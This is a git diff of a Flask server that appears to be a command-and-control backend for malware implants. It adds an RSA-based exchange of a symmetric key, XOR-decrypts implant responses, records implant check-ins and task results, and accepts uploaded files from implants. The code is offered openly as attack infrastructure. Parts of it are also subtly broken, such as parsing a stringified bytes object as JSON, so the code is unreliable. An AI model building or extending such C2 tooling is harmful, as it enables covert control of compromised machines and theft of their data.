@@ -16,6 +16,7 @@ from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
 from psycopg2 import connect, sql
 import WyattWonderland
 import RsaDecryption
+import xor
 
 app = Flask(__name__)
 CORS(app)
@@ -274,47 +275,22 @@ def handle_passwords():
 def new_symkey():
     print("Received response")
     if (request.content_length < 256):
-        data = request.get_data()
-        # print(data)
-        # print(len(data))
-        datastr = data.decode("utf-8")
-        databytes = bytes.fromhex(datastr)
-        data = RsaDecryption.rsadecrypt(databytes)
-        print("response:")
-        print(data)
-        print(str(data))
-        print(jsonify(data))
-        """
-        target_implant_id = data['target_implant_id']
-        task_id = data['task_id']
-        response_data = data['response_data']
-        success = data['success']
-        command = data['command']
-        print("checking command: " + command)
-        print("Querying now")
-        # DUMP BACK INTO TASK_QUEUE
+        try: 
+            data = request.get_data()
+            # print(data)
+            # print(len(data))
+            datastr = data.decode("utf-8")
+            databytes = bytes.fromhex(datastr)
 
-        if success in ["success", "Success"]:
-            success = True
-        else:
-            success = False
+            data = RsaDecryption.rsadecrypt(databytes)
+            xor.symkey=data
+            return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
 
-        query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
-        if query == []:
-            print("\n\nupdate task queue worked\n\n")
-        time = datetime.now()
-        print(response_data, success, time, task_id)
-        response = tools.executeGenericVar(
-            query, [response_data, success, time, task_id])
-        print(response)
-        return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
-
-    except Exception as error:
-        print(error)
-        return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
-else:
-    return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
-    """
+        except Exception as error:
+            print(error)
+            return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
+    else:
+        return "too big", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Implant response endpoint, in json
 @app.route("/response_json", methods=["POST"])
@@ -322,8 +298,24 @@ else:
 def handle_response_json():
     print("Recieved response")
     try:
-        data = request.get_json(force=True)
-        print()
+        if (request.content_length >= 4000):
+            return "nuar", 405, {'Access-Control-Allow-Origin': '*'}
+            
+        data = request.get_data()
+        # print(data)
+        # print(len(data))
+        datastr = data.decode("utf-8")
+        databytes = bytes.fromhex(datastr)
+        
+        data = xor.xorcrypt(databytes, xor.symkey)
+        print("Data bytes: ")
+        print(data)
+        # data = request.get_json(force=True)
+        print("Data string: ")
+        data = str(data)
+        print("Data jsonify")
+        data = json.loads(data)
+
         print("response:")
         target_implant_id = data['target_implant_id']
         tools.updateLastSeen(target_implant_id)
@@ -389,12 +381,15 @@ def get_history():
         print(e)
         return e, {'Access-Control-Allow-Origin': '*'}
 
-
 @app.route("/upload_files", methods=["POST"])
 def upload_files():
     try:
+        id = request.headers['id']
         file = request.files 
-        print("recieved upload_files: \n Response: ")
+        print(id)
         print(file)
+        print("recieved upload_files: \n Response: ")
+        return "success", 200, {'Access-Control-Allow-Origin': '*'}
+
     except Exception as e:
         return e, {'Access-Control-Allow-Origin': '*'}
